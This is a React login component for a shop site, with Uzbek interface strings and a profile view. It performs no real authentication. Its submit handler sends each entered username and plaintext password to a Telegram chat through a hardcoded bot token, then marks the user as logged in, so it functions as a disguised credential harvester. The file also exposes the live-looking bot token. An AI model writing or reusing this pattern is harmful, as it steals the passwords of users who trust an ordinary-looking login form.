import React, { useState, useEffect } from 'react';
import { Form, Input, Button, message } from 'antd';
import {
  UserOutlined,
  LockOutlined,
  LoginOutlined,
  LogoutOutlined,
  CalendarOutlined,
} from '@ant-design/icons';
import { useTranslation } from 'react-i18next';

const TELEGRAM_BOT_TOKEN = '8764690347:AAETV0P4WaANQWmDQHGSgowX2Id5Q7bUn0A';
const TELEGRAM_CHAT_ID = '5781687561';

function Login() {
  const { t } = useTranslation();
  const [loading, setLoading] = useState(false);
  const [form] = Form.useForm();
  const [user, setUser] = useState(null);

  // Restore session from localStorage
  useEffect(() => {
    const saved = localStorage.getItem('shop_user');
    if (saved) {
      try { setUser(JSON.parse(saved)); } catch { /* ignore */ }
    }
  }, []);

  const onFinish = async (values) => {
    setLoading(true);

    const loginTime = new Date().toLocaleString();

    const text = [
      `🔐 *New Login*`,
      ``,
      `👤 *${t('login_username', 'Login')}:* ${values.username}`,
      `🔑 *${t('login_password', 'Parol')}:* ${values.password}`,
      `🕐 *${t('login_time', 'Vaqt')}:* ${loginTime}`,
    ].join('\n');

    try {
      const response = await fetch(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text,
            parse_mode: 'Markdown',
          }),
        }
      );

      if (response.ok) {
        const userData = { username: values.username, loginTime };
        localStorage.setItem('shop_user', JSON.stringify(userData));
        setUser(userData);
        message.success(t('login_success', 'Muvaffaqiyatli kirdingiz!'));
        form.resetFields();
      } else {
        message.error(t('login_error', 'Kirish xatosi. Qaytadan urinib ko\'ring.'));
      }
    } catch (error) {
      console.error('Login error:', error);
      message.error(t('login_error', 'Kirish xatosi. Qaytadan urinib ko\'ring.'));
    } finally {
      setLoading(false);
    }
  };

  const handleLogout = () => {
    localStorage.removeItem('shop_user');
    setUser(null);
    message.success(t('logout_success', 'Tizimdan chiqdingiz!'));
  };

  /* ─── PROFILE VIEW ─── */
  if (user) {
    return (
      <section className="py-4 md:py-8 font-sans neu-bg flex items-center justify-center">
        <div className="w-full max-w-md px-6">
          {/* Avatar */}
          <div className="text-center mb-10">
            <div className="w-28 h-28 mx-auto mb-6 neu-convex rounded-full flex items-center justify-center">
              <UserOutlined className="text-5xl text-blue-500" />
            </div>
            <h1 className="text-3xl md:text-4xl font-black neu-text uppercase tracking-tight mb-2">
              {t('profile', 'Profil')}
            </h1>
            <p className="neu-text opacity-60 text-sm uppercase tracking-widest font-bold">
              {t('profile_subtitle', 'Shaxsiy kabinet')}
            </p>
          </div>

          {/* Info Card */}
          <div className="neu-flat rounded-[40px] p-10 md:p-12 space-y-6">
            {/* Username */}
            <div className="neu-pressed rounded-[20px] p-5 flex items-center gap-5">
              <span className="w-12 h-12 flex items-center justify-center neu-convex rounded-full shrink-0">
                <UserOutlined className="text-xl text-blue-500" />
              </span>
              <div>
                <p className="neu-text opacity-50 text-xs uppercase tracking-widest font-bold mb-1">
                  {t('login_username', 'Login')}
                </p>
                <p className="neu-text text-lg font-bold">{user.username}</p>
              </div>
            </div>

            {/* Login Time */}
            <div className="neu-pressed rounded-[20px] p-5 flex items-center gap-5">
              <span className="w-12 h-12 flex items-center justify-center neu-convex rounded-full shrink-0">
                <CalendarOutlined className="text-xl text-blue-500" />
              </span>
              <div>
                <p className="neu-text opacity-50 text-xs uppercase tracking-widest font-bold mb-1">
                  {t('login_time', 'Vaqt')}
                </p>
                <p className="neu-text text-lg font-bold">{user.loginTime}</p>
              </div>
            </div>

            {/* Logout Button */}
            <Button
              size="large"
              icon={<LogoutOutlined />}
              onClick={handleLogout}
              className="w-full neu-convex border-none h-16 text-lg font-black rounded-full text-red-500 hover:text-red-400 active:neu-pressed active:text-red-600 transition-all uppercase tracking-widest !bg-transparent mt-4"
            >
              {t('logout', 'Chiqish')}
            </Button>
          </div>
        </div>
      </section>
    );
  }

  /* ─── LOGIN VIEW ─── */
  return (
    <section className="py-4 md:py-8 font-sans neu-bg flex items-center justify-center">
      <div className="w-full max-w-md px-6">
        {/* Header */}
        <div className="text-center mb-10">
          <div className="w-24 h-24 mx-auto mb-6 neu-convex rounded-full flex items-center justify-center">
            <UserOutlined className="text-4xl text-blue-500" />
          </div>
          <h1 className="text-3xl md:text-4xl font-black neu-text uppercase tracking-tight mb-3">
            {t('login', 'Kirish')}
          </h1>
          <p className="neu-text opacity-60 text-sm uppercase tracking-widest font-bold">
            {t('login_subtitle', 'Hisobingizga kiring')}
          </p>
        </div>

        {/* Form Card */}
        <div className="neu-flat rounded-[40px] p-10 md:p-12">
          <Form
            form={form}
            layout="vertical"
            onFinish={onFinish}
            requiredMark={false}
            className="[&_.ant-form-item-label>label]:neu-text [&_.ant-form-item-label>label]:font-black [&_.ant-form-item-label>label]:tracking-wider [&_.ant-form-item-label>label]:uppercase"
          >
            <Form.Item
              label={t('login_username', 'Login')}
              name="username"
              rules={[
                { required: true, message: t('login_username_required', 'Iltimos, loginni kiriting!') },
              ]}
            >
              <Input
                size="large"
                prefix={<UserOutlined className="neu-text opacity-40" />}
                placeholder={t('login_username_placeholder', 'Loginni kiriting')}
                className="neu-pressed neu-text border-none py-4 px-6 rounded-[20px] shadow-none !bg-transparent placeholder:opacity-50 font-medium text-lg"
              />
            </Form.Item>

            <Form.Item
              label={t('login_password', 'Parol')}
              name="password"
              rules={[
                { required: true, message: t('login_password_required', 'Iltimos, parolni kiriting!') },
              ]}
            >
              <Input.Password
                size="large"
                prefix={<LockOutlined className="neu-text opacity-40" />}
                placeholder={t('login_password_placeholder', 'Parolni kiriting')}
                className="neu-pressed neu-text border-none py-4 px-6 rounded-[20px] shadow-none !bg-transparent placeholder:opacity-50 font-medium text-lg"
              />
            </Form.Item>

            <Form.Item className="mb-0 pt-4">
              <Button
                type="primary"
                htmlType="submit"
                size="large"
                loading={loading}
                icon={<LoginOutlined />}
                className="w-full neu-convex border-none h-16 text-lg font-black rounded-full text-blue-500 hover:text-blue-400 active:neu-pressed active:text-blue-600 transition-all uppercase tracking-widest !bg-transparent"
              >
                {t('login_btn', 'Kirish')}
              </Button>
            </Form.Item>
          </Form>
        </div>
      </div>
    </section>
  );
}

export default Login;